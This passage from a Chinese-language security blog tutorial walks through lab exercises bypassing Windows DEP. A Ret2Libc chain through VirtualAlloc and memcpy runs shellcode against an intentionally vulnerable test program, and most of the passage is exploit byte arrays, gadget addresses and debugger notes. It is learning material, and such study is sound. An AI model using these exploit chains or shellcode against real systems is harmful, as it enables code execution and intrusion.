class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    chartemp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-3"><a class="markdownIt-Anchor" href="#实验思路-3"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函<br>数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualAlloc 函数申请一段具有执行权限的内存。<br>（ 4）通过 memcpy 函数将 shellcode 复制到 VirtualAlloc 函数申请的可执行内存空间中。<br>（ 5）最后在这段可执行的内存空间中执行 shellcode，实现 DEP 的绕过。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-3"><a class="markdownIt-Anchor" href="#实验步骤-3"></a> 实验步骤：</h4><p><strong>（ 1）先修复 EBP（把 ESP赋值给 EBP），并布置参数</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址覆盖 test 函数的返回地址，然后按照以上参数布置一个能够申请可执行内存空间的 shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>调试程序，在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 0x7C8245C2（ VirtualAlloc 函数的 RETN 0x10）暂停，观察内存状态。EAX 中是我们申请空间的起始地址0x00030000，说明我们的空间申请成功了，此时通过 OllyDbg 的内存窗口也可以看到我们刚刚申请的空间，而且属性是带 E 的标志！</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626140259166-165629394983527.png" alt="image-20220626140259166"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626134703731-165629394983528.png" alt="image-20220626134703731"></p><p><strong>（ 2）把 shellcode 复制到刚申请的内存空间中</strong></p><p>用位于 ntdll.dll 中的 memcpy 函数进行复制，它需要三个参数，依次为<strong>目的内存起始地址</strong>、<strong>源内存起始地址</strong>、<strong>复制长度</strong>，其中目的内存起始地址和复制长度都可以直接写在 shellcode 中，唯一的难点在于对源内存起始地址的确定。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626155811489-165629394983529.png" alt="image-20220626155811489"></p><p>实际上我们不需要精确的定位，只要<strong>保证源内存起始地址在 shellcode 中关键代码的前边</strong>即可，因此可以使用 PUSH ESP JMP EAX 指令来填充这个参数。</p><p>另外一个需要注意的问题，<strong>在空间申请后 EBP 被设置成 0x00000000</strong>，而后边我们还会再用到 EBP，所以还需要<strong>修复 EBP</strong>。 最后还需要注意 VirtualAlloc 函数返回时带有 16（ 0x10）个字节的偏移，要在 shellcode 中要添加相应的填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span><span class="comment">//EAX 指向的指令暂时先用\x90 填充</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在第二次修复 EBP 的 retn 4 处暂停，此时 EBP=ESP=0x0012FEA4，而 memcpy 中的源内存地址参数位于 EBP+0x0C（0x0012FEB0），如果我们要使用 PUSH ESP 的方式设置源内存地址，就需要让 ESP 指向 EBP+0x10（0x0012FEB4），这样执行完 PUSH 操作后 ESP 的值刚好放在 EBP+0x0C。为了达到这个目的有两个问题需要解决： <strong>ESP 如何指向 EBP+0x10</strong> 和 <strong>PUSH ESP 操作后程序控制权如何回收。</strong></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626161001067-165629394983631.png" alt="image-20220626161001067"></p><ol><li>先来解决第一个问题。当执行完 retn 4 后，ESP 指向 EBP+0x8 位置，现在要想 ESP 指向 EBP+0x10 就只需要再执行一条 pop retn 指令。在当前 EBP 的位置放置 POP ECX RETN（地址为 0x7CA6785F）。</li><li>再来解决第二个问题。在执行完 PUSH 操作后收回程序控制权的最佳位置在 EBP+0x14，因为在这个位置执行 RETN 指令既保证了 memcpy 参数不被破坏，又可以减小 shellcode 长度。故在执行完 PUSH 操作后我们只需要 POP 两次就可以让 ESP 指向 EBP+0x14，所以 JMP EAX指令中的 EAX 只要指向类似 POP POP RETN 指令即可。然后在 EBP+0x14 位置放置 memcpy函数的切入点 0x7C94AFAC（ MOV ESI,DWORD PTR SS:[EBP+C]），这样程序在执行类似 POP POP RETN 指令中 RETN 时就可以转入 memcpy 函数中执行复制操作了。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在 memcpy 函数复制结束返回前暂停，此时 ESP=0x0012FEA8，位于 shellcode 中，并且这里只是放置了填充符。它位于 pop pop retn 指令地址和 memcpy 参数之间，并且紧挨着 memcpy 第一个参数。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626165428530-165629394983530.png" alt="image-20220626165428530"></p><p>接下来，只要在这个位置（0x0012FEA8）填上申请的可执行内存空间起始地址（0x00030000），就能转入该区域执行。</p><p>由上图可知，复制的源内存地址为 0x0012FEB4，就是 memcpy 函数的复制长度参数所在位置，所以只要在它后面接弹出对话框的机器码就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行结果，并没有弹出我们预想的 ”failwest“ 对话框。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170404322-165629394983632.png" alt="image-20220626170404322"></p><p>因为memcpy 函数复制过来的不只是弹出对话框的机器码，还包含着弹出对话框机器码前面的一些指令和参数，而这些东西会破坏程序的执行。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626172315190-165629394983633.png" alt="image-20220626172315190"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170532058-165629394983634.png" alt="image-20220626170532058"></p><p>最终 shellcode 如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先是对 ESI 和 EDI 指向内存的操作，在 0x00030004 和 0x00030005 分别对 ESI 和 EDI 指向的内存有读取操作，我们需要保证 ESI 和 EDI 指向合法的位置。 ESI 和 EDI 是在 memcpy 函数返回前被 POP 进去的。</p><p>接下来是 0x00030006 的 XCHG EAX,EBP 指令，这条指令直接破坏了 ESP，而在弹出对话框的机器码中有 PUSH 操作，所以 ESP 要修复，故我们在弹出对话框的机器码前边使用 0x94 填充，在 0x00030013 处来修复这个问题。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180652350-165629394983935.png" alt="image-20220626180652350"></p><p>最后是 0x0003000F 的对[EAX]操作，如果 0x00030010 处使用 0x90 填充，结果就是对[EAX+0x909094FC]操作，这会引发异常，所以我们使用 0x00 填充 0x00030010，避免出现异常。</p><blockquote><p>实际上我们有种更简单的方法来处理掉这些垃圾指令，从上图中大家可以看到我们弹出对话框的机器码起始地址为 0x00030008，我们可以让 memcpy 函数返回时直接跳转到这个位置，跃过前边的垃圾指令。</p></blockquote><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180928314-165629394984036.png" alt="image-20220626180928314"></p><h1 id="利用可执行内存挑战-dep"><a class="markdownIt-Anchor" href="#利用可执行内存挑战-dep"></a> 利用可执行内存挑战 DEP</h1><p>有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程，我们的 shellcode 就有执行的机会。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626181911817-165629394984037.png" alt="image-20220626181911817"></p><p>这个实验与上一节的利用 VirtualAlloc 相似，只不过这次实验利用的是已经存在的可读可写可执行的内存空间，而上一节的实验是我们利用的是通过 VirtualAlloc() 函数创造的内存空间。所以这个实验与上一节实验基本相同，在此就不过多介绍。</p><h2 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x08\x00\x14\x00&quot;</span><span 